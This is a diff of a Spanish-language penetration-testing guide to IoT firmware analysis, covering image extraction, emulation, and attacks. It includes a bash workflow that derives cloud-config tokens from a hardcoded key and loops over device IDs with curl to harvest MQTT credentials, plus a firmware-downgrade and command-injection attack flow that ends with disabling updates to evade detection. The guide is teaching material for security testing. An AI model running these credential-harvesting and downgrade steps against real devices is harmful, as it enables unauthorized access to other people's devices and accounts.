@@ -1,4 +1,4 @@
-# Análisis de firmware
+# Firmware Análisis
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -19,38 +19,42 @@ synology-encrypted-archive-decryption.md
 android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 {{#endref}}
 
-Firmware es el software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que asegura que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, conduciendo al arranque del sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.
+{{#ref}}
+mediatek-xflash-carbonara-da2-hash-bypass.md
+{{#endref}}
+
+Firmware es el software esencial que permite que los dispositivos funcionen correctamente administrando y facilitando la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, asegurando que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, lo que conduce al arranque del sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.
 
 ## **Recopilación de información**
 
-**Recopilación de información** es un paso inicial crítico para comprender la composición de un dispositivo y las tecnologías que emplea. Este proceso implica recopilar datos sobre:
+**Recopilar información** es un paso inicial crítico para entender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:
 
-- La arquitectura de la CPU y el sistema operativo que utiliza
-- Detalles del bootloader
-- Distribución del hardware y hojas de datos (datasheets)
-- Métricas de la base de código y ubicaciones del código fuente
-- Librerías externas y tipos de licencia
+- La arquitectura de la CPU y el sistema operativo que ejecuta
+- Detalles del Bootloader
+- Distribución del hardware y hojas de datos
+- Métricas de la codebase y ubicaciones del código fuente
+- Bibliotecas externas y tipos de licencia
 - Historiales de actualizaciones y certificaciones regulatorias
 - Diagramas arquitectónicos y de flujo
 - Evaluaciones de seguridad y vulnerabilidades identificadas
 
-Para este propósito, las herramientas de open-source intelligence (OSINT) son invaluables, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuitos que pueden aprovecharse para encontrar posibles problemas.
+Para esto, las herramientas de inteligencia de código abierto (OSINT) son invaluables, al igual que el análisis de cualquier componente de software open-source disponible mediante revisiones manuales y automatizadas. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que se puede aprovechar para encontrar posibles problemas.
 
-## **Adquisición del firmware**
+## **Adquisición del Firmware**
 
-Obtener firmware puede abordarse por diversos medios, cada uno con su propio nivel de complejidad:
+Obtener firmware se puede abordar por varios medios, cada uno con su propio nivel de complejidad:
 
 - **Directamente** desde la fuente (desarrolladores, fabricantes)
-- **Compilándolo** a partir de las instrucciones proporcionadas
+- **Compilándolo** desde las instrucciones proporcionadas
 - **Descargando** desde sitios de soporte oficiales
-- Utilizar consultas de **Google dork** para encontrar archivos de firmware alojados
+- Utilizando consultas **Google dork** para encontrar archivos de firmware alojados
 - Accediendo directamente al almacenamiento en la nube, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
-- Interceptando **actualizaciones** mediante técnicas man-in-the-middle
-- **Extrayendo** desde el dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
-- **Sniffing** de solicitudes de actualización dentro de la comunicación del dispositivo
-- Identificar y usar **hardcoded update endpoints**
+- Interceptando **updates** mediante técnicas man-in-the-middle
+- **Extrayendo** del dispositivo a través de conexiones como **UART**, **JTAG**, o **PICit**
+- **Sniffing** de las solicitudes de actualización dentro de la comunicación del dispositivo
+- Identificando y usando **hardcoded update endpoints**
 - **Dumping** desde el bootloader o la red
-- **Retirar y leer** el chip de almacenamiento, cuando todo lo demás falla, usando herramientas de hardware apropiadas
+- **Extrayendo y leyendo** el chip de almacenamiento, cuando todo lo demás falla, usando herramientas de hardware apropiadas
 
 ## Analizando el firmware
 
@@ -63,7 +67,7 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`: si la entropía es baja, no es probable que esté cifrada. Si es alta, es probable que esté cifrada (o comprimida de alguna manera).
+Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si la entropía es baja, es poco probable que esté encriptada. Si es alta, probablemente esté encriptada (o comprimida de alguna forma).
 
 Además, puedes usar estas herramientas para extraer **archivos incrustados dentro del firmware**:
 
@@ -74,14 +78,14 @@ Además, puedes usar estas herramientas para extraer **archivos incrustados dent
 
 O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.
 
-### Obtener el Filesystem
+### Obtener el sistema de archivos
 
-Con las herramientas mencionadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el filesystem**.\
-Binwalk normalmente lo extrae dentro de una **carpeta nombrada según el tipo de filesystem**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+Con las herramientas comentadas previamente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
+Binwalk normalmente lo extrae dentro de una **carpeta nombrada según el tipo de sistema de archivos**, que normalmente es uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
-#### Extracción manual del Filesystem
+#### Extracción manual del sistema de archivos
 
-A veces, binwalk **no tendrá el byte mágico del filesystem en sus firmas**. En esos casos, usa binwalk para **encontrar el offset del filesystem y recuperar el filesystem comprimido** del binario y **extraer manualmente** el filesystem según su tipo usando los pasos siguientes.
+A veces, binwalk **no detectará el magic byte del sistema de archivos en sus firmas**. En esos casos, utiliza binwalk para **encontrar el offset del sistema de archivos y carve el sistema de archivos comprimido** desde el binario y **extraer manualmente** el sistema de archivos según su tipo usando los pasos siguientes.
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -93,7 +97,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
-Ejecute el siguiente **dd command** para extraer el sistema de archivos Squashfs.
+Ejecute el siguiente **dd command** para realizar un carving del sistema de archivos Squashfs.
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
@@ -107,13 +111,13 @@ Alternativamente, también se puede ejecutar el siguiente comando.
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
-- Para squashfs (utilizado en el ejemplo anterior)
+- Para squashfs (usado en el ejemplo anterior)
 
 `$ unsquashfs dir.squashfs`
 
-Los archivos estarán en el directorio "`squashfs-root`" posteriormente.
+Los archivos estarán en el directorio "`squashfs-root`" después.
 
-- Para archivos CPIO
+- Para archivos cpio
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
@@ -121,7 +125,7 @@ Los archivos estarán en el directorio "`squashfs-root`" posteriormente.
 
 `$ jefferson rootfsfile.jffs2`
 
-- Para sistemas de archivos ubifs con NAND flash
+- Para sistemas de archivos ubifs en NAND flash
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
@@ -129,11 +133,11 @@ Los archivos estarán en el directorio "`squashfs-root`" posteriormente.
 
 ## Análisis del firmware
 
-Una vez obtenido el firmware, es esencial diseccionarlo para comprender su estructura y posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.
+Una vez obtenido el firmware, es esencial diseccionarlo para entender su estructura y posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.
 
 ### Herramientas de análisis inicial
 
-Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer strings, analizar datos binarios y comprender los detalles de particiones y sistemas de archivos:
+Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer strings, analizar datos binarios y entender los detalles de particiones y sistemas de archivos:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -142,59 +146,59 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
-Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere ausencia de cifrado, mientras que una entropía alta indica posible cifrado o compresión.
+Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Baja entropía sugiere ausencia de cifrado, mientras que alta entropía indica posible cifrado o compresión.
 
-Para extraer **archivos embebidos**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspección de archivos.
+Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para la inspección de archivos.
 
 ### Extracción del sistema de archivos
 
-Usando `binwalk -ev <bin>` suele ser posible extraer el sistema de archivos, normalmente en un directorio llamado según el tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de sistema de archivos debido a la ausencia de bytes mágicos, es necesario realizar una extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos, seguido del comando `dd` para extraer el sistema de archivos:
+Usando `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio nombrado según el tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no reconoce el tipo de sistema de archivos debido a la ausencia de magic bytes, es necesario realizar una extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos, seguido del comando `dd` para extraer el sistema de archivos:
 ```bash
 $ binwalk DIR850L_REVB.bin
 
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
-Después, según el tipo de filesystem (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente el contenido.
+Después, dependiendo del tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se usan diferentes comandos para extraer manualmente el contenido.
 
 ### Análisis del sistema de archivos
 
-Con el sistema de archivos extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a daemons de red inseguros, credenciales hardcodeadas, endpoints de API, funcionalidades de servidores de actualización, código sin compilar, scripts de arranque y binarios compilados para análisis offline.
+Con el sistema de archivos extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a daemons de red inseguros, credenciales hardcoded, endpoints de API, funcionalidades del servidor de actualizaciones, código sin compilar, scripts de arranque y binarios compilados para análisis offline.
 
-**Ubicaciones clave** y **elementos** para inspeccionar incluyen:
+**Ubicaciones clave** y **elementos** a inspeccionar incluyen:
 
-- **etc/shadow** y **etc/passwd** para credenciales de usuarios
-- Certificados SSL y claves en **etc/ssl**
-- Archivos de configuración y scripts por posibles vulnerabilidades
+- **etc/shadow** y **etc/passwd** para credenciales de usuario
+- Certificados y claves SSL en **etc/ssl**
+- Archivos de configuración y scripts en busca de vulnerabilidades potenciales
 - Binarios embebidos para análisis adicional
-- Servidores web y binarios comunes en dispositivos IoT
+- Servidores web comunes de dispositivos IoT y binarios
 
 Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:
 
 - [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
-- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análisis completo de firmware
+- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis integral del firmware
 - [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico
 
 ### Verificaciones de seguridad en binarios compilados
 
-Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben ser examinados en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios no protegidos que podrían ser explotados.
+Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben ser escrutados en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios desprotegidos que podrían ser explotados.
 
 ## Recolección de configuración en la nube y credenciales MQTT mediante tokens de URL derivados
 
-Muchos hubs IoT obtienen su configuración por dispositivo desde un endpoint en la nube que se ve así:
+Muchos hubs IoT obtienen la configuración por dispositivo desde un endpoint en la nube que se parece a:
 
-- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)
+- `https://<api-host>/pf/<deviceId>/<token>`
 
-Durante el análisis del firmware puede que encuentres que <token> se deriva localmente del deviceId usando un secreto hardcodeado, por ejemplo:
+Durante el análisis del firmware puede encontrar que `<token>` se deriva localmente del deviceId usando un secreto hardcoded, por ejemplo:
 
 - token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
 
-Este diseño permite a cualquiera que conozca un deviceId y la STATIC_KEY reconstruir la URL y obtener la configuración en la nube, frecuentemente revelando credenciales MQTT en texto plano y prefijos de tópico.
+Este diseño permite que cualquiera que conozca un deviceId y la STATIC_KEY reconstruya la URL y descargue la configuración en la nube, revelando a menudo credenciales MQTT en texto plano y prefijos de topic.
 
 Flujo de trabajo práctico:
 
-1) Extraer deviceId de los registros de arranque UART
+1) Extraer deviceId de los logs de arranque UART
 
-- Conecta un adaptador UART de 3.3V (TX/RX/GND) y captura los registros:
+- Conectar un adaptador UART de 3.3V (TX/RX/GND) y capturar los registros:
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
@@ -207,7 +211,7 @@ MQTT: mqtt://mq-gw.vendor.tld:8001
 
 - Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
 - Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
-- Derivar el token en Bash y convertir el digest a mayúsculas:
+- Deriva el token en Bash y convierte el digest a mayúsculas:
 ```bash
 DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
@@ -215,25 +219,25 @@ printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
 3) Recolectar la configuración en la nube y las credenciales MQTT
 
-- Construye la URL y obtén el JSON con curl; analiza con jq para extraer secretos:
+- Construye la URL y recupera el JSON con curl; analiza con jq para extraer secretos:
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) Abusar de MQTT en texto plano (plaintext) y de ACLs de topics débiles (si están presentes)
+4) Abusar de plaintext MQTT y ACLs de topic débiles (si están presentes)
 
-- Usar las credenciales recuperadas para suscribirse a topics de mantenimiento y buscar eventos sensibles:
+- Usa credenciales recuperadas para suscribirte a maintenance topics y buscar eventos sensibles:
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 -i <client_id> -u <username> -P <password> \
 -t "<topic_prefix>/<deviceId>/admin" -v
 ```
-5) Enumerar identificadores de dispositivos predecibles (a escala, con autorización)
+5) Enumerar IDs de dispositivo predecibles (a escala, con autorización)
 
-- Muchos ecosistemas incrustan bytes OUI del fabricante/producto/tipo seguidos de un sufijo secuencial.
-- Puedes iterar identificadores candidatos, derivar tokens y obtener configuraciones programáticamente:
+- Muchos ecosistemas incorporan bytes vendor OUI/product/type seguidos por un sufijo secuencial.
+- Puedes iterar IDs candidatos, derivar tokens y obtener configs programáticamente:
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
@@ -243,19 +247,18 @@ curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.pas
 done
 ```
 Notas
-- Obtén siempre autorización explícita antes de intentar enumeración masiva.
-- Prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo cuando sea posible.
+- Obtén siempre autorización explícita antes de intentar mass enumeration.
+- Prefiere emulation o static analysis para recuperar secrets sin modificar el target hardware cuando sea posible.
 
+El proceso de emulación de firmware permite el **dynamic analysis** ya sea del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede encontrar desafíos por dependencias de hardware o de arquitectura, pero transferir el root filesystem o binarios específicos a un dispositivo con CPU architecture y endianness coincidentes, como una Raspberry Pi, o a una virtual machine preconstruida, puede facilitar pruebas adicionales.
 
-El proceso de emular firmware permite **dynamic analysis** tanto del funcionamiento de un dispositivo como de un programa individual. Este enfoque puede encontrar desafíos por dependencias de hardware o arquitectura, pero transferir el root filesystem o binarios específicos a un dispositivo con arquitectura y endianness coincidentes, como un Raspberry Pi, o a una máquina virtual preconstruida, puede facilitar pruebas adicionales.
+### Emulación de binaries individuales
 
-### Emulating Individual Binaries
+Para examinar programas individuales, identificar la endianness y la CPU architecture del programa es crucial.
 
-Para examinar programas individuales, es crucial identificar el endianness y la arquitectura de la CPU del programa.
+#### Ejemplo con arquitectura MIPS
 
-#### Example with MIPS Architecture
-
-Para emular un binario de arquitectura MIPS, se puede usar el comando:
+Para emular un binary de arquitectura MIPS, se puede usar el comando:
 ```bash
 file ./squashfs-root/bin/busybox
 ```
@@ -263,7 +266,7 @@ Y para instalar las herramientas de emulación necesarias:
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
-Para MIPS (big-endian), `qemu-mips` se usa, y para binarios little-endian, `qemu-mipsel` sería la opción.
+For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.
 
 #### Emulación de la arquitectura ARM
 
@@ -271,44 +274,44 @@ Para binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm` para
 
 ### Emulación de sistema completo
 
-Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), y otras, facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.
+Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), y otras, facilitan la emulación completa de firmware, automatizando el proceso y ayudando en el análisis dinámico.
 
 ## Análisis dinámico en la práctica
 
-En esta etapa se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener acceso shell al OS y al sistema de ficheros. La emulación puede no reproducir perfectamente las interacciones con el hardware, lo que puede requerir reinicios de la emulación. El análisis debe volver a inspeccionar el sistema de ficheros, explotar páginas web expuestas y servicios de red, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son críticas para identificar posibles backdoor.
+En esta fase se usa un entorno de dispositivo real o emulado para el análisis. Es esencial mantener acceso a shell al OS y al sistema de archivos. La emulación puede no reproducir perfectamente las interacciones con el hardware, por lo que pueden ser necesarios reinicios ocasionales de la emulación. El análisis debe revisar nuevamente el sistema de archivos, explotar páginas web y servicios de red expuestos, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son críticas para identificar posibles backdoors.
 
 ## Técnicas de análisis en tiempo de ejecución
 
-El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.
+El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para colocar breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.
 
-## Explotación binaria y Proof-of-Concept
+## Explotación binaria y prueba de concepto
 
-Desarrollar un PoC para vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de tiempo de ejecución sobre binarios en sistemas embebidos son raras, pero cuando existen, pueden ser necesarias técnicas como Return Oriented Programming (ROP).
+Desarrollar un PoC para vulnerabilidades identificadas requiere una comprensión profunda de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de tiempo de ejecución para binarios en sistemas embebidos son raras, pero cuando están presentes, técnicas como Return Oriented Programming (ROP) pueden ser necesarias.
 
 ## Sistemas operativos preparados para análisis de firmware
 
 Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.
 
-## OSs preparados para analizar Firmware
+## OS preparados para analizar firmware
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudarte a realizar security assessment y penetration testing de Internet of Things (IoT) devices. Te ahorra mucho tiempo proporcionando un entorno pre-configurado con todas las herramientas necesarias cargadas.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo para pruebas de seguridad embebida basado en Ubuntu 18.04, preinstalado con herramientas para pruebas de seguridad de firmware.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro destinada a ayudarte a realizar evaluaciones de seguridad y pruebas de penetración de dispositivos Internet of Things (IoT). Te ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias cargadas.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo para pruebas de seguridad embebida basado en Ubuntu 18.04, precargado con herramientas para pruebas de seguridad de firmware.
 
-## Firmware Downgrade Attacks & Insecure Update Mechanisms
+## Ataques de downgrade de firmware & mecanismos de actualización inseguros
 
-Incluso cuando un proveedor implementa comprobaciones de firma criptográfica para imágenes de firmware, **la protección contra version rollback (downgrade) se omite con frecuencia**. Cuando el boot- o recovery-loader solo verifica la firma con una clave pública embebida pero no compara la *versión* (o un contador monotónico) de la imagen que se va a flashear, un atacante puede legítimamente instalar un **firmware más antiguo y vulnerable que aún conserva una firma válida** y así re-introducir vulnerabilidades parcheadas.
+Incluso cuando un proveedor implementa comprobaciones de firma criptográfica para imágenes de firmware, **la protección contra rollback de versión (downgrade) suele omitirse**. Si el boot- o recovery-loader solo verifica la firma con una clave pública embebida pero no compara la *versión* (o un contador monotónico) de la imagen que se está flasheando, un atacante puede instalar legítimamente un **firmware anterior y vulnerable que aún posee una firma válida** y así reintroducir vulnerabilidades parcheadas.
 
 Flujo de ataque típico:
 
 1. **Obtain an older signed image**
-* Consíguela desde el portal público de descargas del proveedor, CDN o sitio de soporte.
-* Extráela de aplicaciones móviles/escritorio complementarias (p. ej. dentro de un Android APK bajo `assets/firmware/`).
-* Recupérala desde repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
-2. **Upload or serve the image to the device** vía cualquier canal de actualización expuesto:
+* Grab it from the vendor’s public download portal, CDN or support site.
+* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
+* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
+2. **Upload or serve the image to the device** via any exposed update channel:
 * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
-* Muchos dispositivos IoT de consumo exponen *unauthenticated* endpoints HTTP(S) que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
-3. Tras el downgrade, explotar una vulnerabilidad que fue parcheada en la versión más reciente (por ejemplo, un filtro para command-injection que se agregó más tarde).
-4. Opcionalmente volver a flashear la imagen más reciente o desactivar las actualizaciones para evitar la detección una vez que se consigue persistencia.
+* Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *no autenticados* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y desencadenan recuperación/actualización.
+3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
+4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.
 
 ### Ejemplo: Command Injection After Downgrade
 ```http
@@ -317,11 +320,11 @@ Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando de shell sin sanitización, lo que permite la inyección de comandos arbitrarios (aquí – habilitando SSH key-based root access). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrades hace que la corrección no sirva de nada.
+En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando de shell sin saneamiento, lo que permite la inyección de comandos arbitrarios (aquí: habilitar acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrades hace que la corrección sea inútil.
 
-### Extracting Firmware From Mobile Apps
+### Extracción de firmware de aplicaciones móviles
 
-Muchos proveedores incluyen imágenes completas de firmware dentro de sus aplicaciones móviles complementarias para que la app pueda actualizar el dispositivo vía Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra`, o incluso un simple `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
+Muchos proveedores empaquetan imágenes completas de firmware dentro de sus aplicaciones móviles complementarias para que la app pueda actualizar el dispositivo por Bluetooth/Wi‑Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el simple `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
@@ -329,17 +332,17 @@ firmware_v1.3.11.490_signed.bin
 ```
 ### Lista de verificación para evaluar la lógica de actualización
 
-* ¿Está el transporte/autenticación del *update endpoint* adecuadamente protegido (TLS + authentication)?
-* ¿El dispositivo compara **version numbers** o un **monotonic anti-rollback counter** antes de flashing?
-* ¿La imagen se verifica dentro de una secure boot chain (e.g. signatures checked by ROM code)?
-* ¿El userland code realiza comprobaciones de sanity adicionales (e.g. allowed partition map, model number)?
-* ¿Los flujos de actualización *partial* o *backup* están reutilizando la misma validation logic?
+* ¿Está el transporte/autenticación del *update endpoint* adecuadamente protegido (TLS + autenticación)?
+* ¿Compara el dispositivo **version numbers** o un **monotonic anti-rollback counter** antes de flashear?
+* ¿La imagen se verifica dentro de una secure boot chain (p.ej., firmas comprobadas por ROM code)?
+* ¿El userland code realiza comprobaciones adicionales de sanity (p.ej., mapa de particiones permitido, número de modelo)?
+* ¿Los flujos de actualización *partial* o *backup* reutilizan la misma lógica de validación?
 
-> 💡  Si alguno de los anteriores falta, la plataforma probablemente sea vulnerable a rollback attacks.
+> 💡  Si falta alguno de los anteriores, la plataforma probablemente sea vulnerable a rollback attacks.
 
 ## Vulnerable firmware to practice
 
-Para practicar el descubrimiento de vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.
+Para practicar el descubrimiento de vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerables como punto de partida.
 
 - OWASP IoTGoat
 - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
@@ -363,7 +366,7 @@ Para practicar el descubrimiento de vulnerabilidades en firmware, usa los siguie
 
 - [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
 
-## Formación y Certificación
+## Formación y certificaciones
 
 - [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
 
